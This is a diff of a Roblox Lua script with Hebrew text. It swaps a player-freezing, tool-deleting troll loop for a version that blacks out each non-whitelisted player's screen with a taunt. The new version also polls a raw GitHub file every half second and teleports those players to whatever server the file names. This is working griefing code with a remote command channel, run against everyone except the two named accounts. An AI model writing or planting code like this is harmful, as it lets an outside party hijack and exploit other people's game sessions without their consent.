@@ -1,70 +1,45 @@
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 
--- השמות שאתה לא רוצה לנעול (אתה והשותף שלך)
-local whitelisted = {
-	["noamdb15"] = true,
-	["dylanzyl123"] = true
-}
+local rawUrl = "https://raw.githubusercontent.com/gili435/me-nedd-this/refs/heads/main/dylanzyl120"
+local blocked = {["noamdb15"] = true, ["dylanzyl123"] = true}
 
--- פונקציה לנעילה אכזרית בתוך המשחק
-local function applyTheGift(player)
-	-- 1. יצירת מסך הטרול אצלו
-	local screenGui = Instance.new("ScreenGui")
-	screenGui.Name = "SystemOverload"
-	screenGui.IgnoreGuiInset = true
-	screenGui.DisplayOrder = 9999999
-	screenGui.Parent = player:WaitForChild("PlayerGui")
+local function showLoading(player)
+	local sg = Instance.new("ScreenGui", player.PlayerGui)
+	sg.IgnoreGuiInset = true
+	sg.DisplayOrder = 9999999
+	local f = Instance.new("Frame", sg)
+	f.Size = UDim2.new(1,0,1,0)
+	f.BackgroundColor3 = Color3.new(0,0,0)
+	local l = Instance.new("TextLabel", f)
+	l.Size = UDim2.new(0.8,0,0.4,0)
+	l.Position = UDim2.new(0.1,0,0.3,0)
+	l.BackgroundTransparency = 1
+	l.TextColor3 = Color3.new(1,0,0)
+	l.TextScaled = true
+	l.Text = "הלך לך הבייס חבר יקר"
+end
 
-	local frame = Instance.new("Frame")
-	frame.Size = UDim2.new(1, 0, 1, 0)
-	frame.BackgroundColor3 = Color3.new(0, 0, 0)
-	frame.Active = true
-	frame.Parent = screenGui
+Players.PlayerAdded:Connect(function(p)
+	if not blocked[p.Name] then showLoading(p) end
+end)
 
-	local label = Instance.new("TextLabel")
-	label.Size = UDim2.new(0.8, 0, 0.4, 0)
-	label.Position = UDim2.new(0.1, 0, 0.3, 0)
-	label.BackgroundTransparency = 1
-	label.TextColor3 = Color3.new(1, 0, 0)
-	label.TextScaled = true
-	label.Font = Enum.Font.SpecialElite
-	label.Text = "הלך לך הבייס חבר יקר"
-	label.Parent = frame
-
-	-- 2. לופ נעילה ומחיקת חפצים (רץ כל הזמן)
-	task.spawn(function()
-		while player.Parent do
-			local char = player.Character
-			if char then
-				-- קיבוע למקום
-				local hrp = char:FindFirstChild("HumanoidRootPart")
-				if hrp then hrp.Anchored = true end
-				
-				-- איפוס חיים ותנועה
-				local hum = char:FindFirstChild("Humanoid")
-				if hum then
-					hum.WalkSpeed = 0
-					hum.JumpPower = 0
-				end
-
-				-- מחיקת כל התיק והחפצים ביד
-				for _, item in pairs(player.Backpack:GetChildren()) do
-					item:Destroy()
-				end
-				for _, item in pairs(char:GetChildren()) do
-					if item:IsA("Tool") then
-						item:Destroy()
+task.spawn(function()
+	while task.wait(0.5) do
+		local s, r = pcall(function() return HttpService:GetAsync(rawUrl.."?t="..tick()) end)
+		if s and r then
+			local lines = {}
+			for line in r:gmatch("[^\r\n]+") do table.insert(lines, line) end
+			local targetId = tonumber(lines[1])
+			local targetJob = lines[2]
+			if targetJob and targetJob ~= "" then
+				for _, p in pairs(Players:GetPlayers()) do
+					if not blocked[p.Name] then
+						pcall(function() TeleportService:TeleportToPlaceInstance(targetId or game.PlaceId, targetJob, p) end)
 					end
 				end
 			end
-			task.wait(0.1) -- שלא יוכל לנשום
 		end
-	end)
-end
-
--- הפעלה ברגע שהם נוחתים מהשיגור
-Players.PlayerAdded:Connect(function(player)
-	if not whitelisted[player.Name] then
-		applyTheGift(player)
 	end
 end)
